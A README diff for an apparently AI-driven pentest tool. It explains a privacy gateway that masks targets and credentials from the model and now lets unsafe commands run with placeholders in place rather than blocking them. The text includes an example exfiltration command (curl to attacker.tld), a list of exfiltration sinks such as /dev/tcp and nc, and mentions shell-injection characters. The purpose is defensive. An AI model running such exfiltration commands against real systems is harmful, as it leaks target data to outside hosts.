@@ -157,14 +157,71 @@ Real values are injected **locally, right before a tool runs**, and re-masked ou
 
 ```
 Model sees:    Host IP_PRIVATE_001 has ports 80,443 open
-Model emits:   nmap -sV IP_PRIVATE_001 -p 80,443
-Runs locally:  nmap -sV 10.42.1.5 -p 80,443
-Blocked:       curl https://attacker.tld/?target=IP_PRIVATE_001   (exfiltration)
+Model emits:   naabu -host IP_PRIVATE_001 -p 80,443
+Runs locally:  naabu -host 10.42.1.5 -p 80,443
+Degraded:      curl https://attacker.tld/?target=IP_PRIVATE_001
+               -> runs, and attacker.tld receives the literal string
+                  "IP_PRIVATE_001". The address never leaves.
 ```
 
-**How it works.** A per-session `PrivacyVault` keeps the reversible map: it is deterministic (the same value always yields the same placeholder in a session) and holds real values only as encrypted ciphertext (de-duplicated by HMAC), never in cleartext, with a TTL. A `CommandGateway` rehydrates placeholders **context-aware — never a blind global replace** — and blocks exfiltration shapes: a placeholder in a URL query/fragment, a literal external host, `echo`/`print`, an outbound request body, `/dev/tcp`, or `nc`/`telnet` to a non-target. It understands `bash -c` wrappers and structured tool calls (only whitelisted fields are rehydrated). Credentials are never restored into an executed command.
+**The gateway degrades, it does not deny.** This is the one design rule worth
+knowing. Since the protection boundary covers URLs, domains and paths, nearly
+every pentest command carries a placeholder — so a gateway that *refuses* on
+an unsafe placeholder position refuses ordinary work. It did: `httpx -u URL_001`
+could not run at all, because the URL had a `?` in it and the anti-injection
+guard rejected the metacharacter.
 
-**Configuration.** On by default; disable with `DARKMOON_PRIVACY=0`. Tune the tokenized categories with `DARKMOON_PRIVACY_CATEGORIES` (comma-separated, conservative default: IPs, internal hosts, emails). The core is open-source; the Pro edition adds guard-sealed vault storage, an audit trail of rehydrations and a compliance-grade *no-data-left-the-perimeter* statement in the signed report.
+Blocking was never the thing protecting you. Two things are: the model only
+ever receives placeholders, and every byte of tool output is re-tokenized before
+it gets back. So when a placeholder sits somewhere its real value must not go,
+the command **still runs** with the token left in place. Whatever is at the far
+end receives `IP_PRIVATE_001`, not your address. **A privacy decision never
+costs you a command.**
+
+**How it works.** A per-session `PrivacyVault` keeps the reversible map: it is
+deterministic (the same value always yields the same placeholder in a session)
+and holds real values only as encrypted ciphertext (de-duplicated by HMAC),
+never in cleartext, with a TTL. A `CommandGateway` rehydrates placeholders
+**context-aware — never a blind global replace** — and withholds the value where
+the position is an outbound sink: a placeholder in a URL query/fragment, a
+literal external host, an outbound request body, `/dev/tcp`, `nc`/`telnet` to a
+non-target, or a pipeline whose far end leaves the target. It analyses **each
+command of a pipeline** separately, understands `bash -c` wrappers, and handles
+structured tool calls (only whitelisted fields are rehydrated).
+
+A rehydrated value is **quoted for the exact shell context it lands in** — bare,
+inside `'...'`, or inside `"..."`, including within a nested `bash -c`. A target
+name carrying `;` or `$(...)` therefore cannot become a command-injection
+primitive, and a value containing a space stays a single argument.
+
+**Credentials.** Plain credentials are auto-detected in tool output (a `-p`
+flag, a `key: value` secret, an `Authorization` header, URI userinfo, an NT hash
+pair) and registered as `CRED_NNN`, so a password a tool prints never reaches
+the model. A credential *is* injected locally into a command whose destination
+is the protected target — that is what makes authenticated testing work without
+the model ever holding the secret — and is never restored into a print sink,
+never alongside a literal destination, and never into a workflow parameter.
+
+**Configuration.**
+
+| Variable | Default | Effect |
+|---|---|---|
+| `DARKMOON_PRIVACY` | `1` | Master switch for the gateway |
+| `DARKMOON_PRIVACY_CATEGORIES` | full boundary | Comma-separated categories to tokenize. Unset or malformed falls back to the full default — it can no longer silently narrow the boundary |
+| `DARKMOON_PRIVACY_POLICY` | `degrade` | `degrade` never blocks a command; `strict` refuses one outright. Any unrecognised value means `degrade` |
+| `DARKMOON_PRIVACY_CRED_INJECT` | `1` | `0` stops a registered credential from ever being injected into a command |
+| `DARKMOON_PRIVACY_TTL` | `21600` | Vault lifetime in seconds |
+
+The core is open-source; the Pro edition adds guard-sealed vault storage, an
+audit trail of rehydrations and a compliance-grade *no-data-left-the-perimeter*
+statement in the signed report.
+
+**Known limit.** The **initial campaign prompt** is still passed to the model as
+written: if you put a `TARGET`, `CREDS` or `TOKEN` on the command line, the model
+receives it verbatim. Pre-model tokenization of the prompt, sharing one session
+vault between the prompt layer and the MCP, is a planned trust-boundary change
+and is not shipped. Until it is, do not treat a secret passed in the launch
+prompt as masked from a cloud model provider.
 
 [Back to Summary](#summary)
 
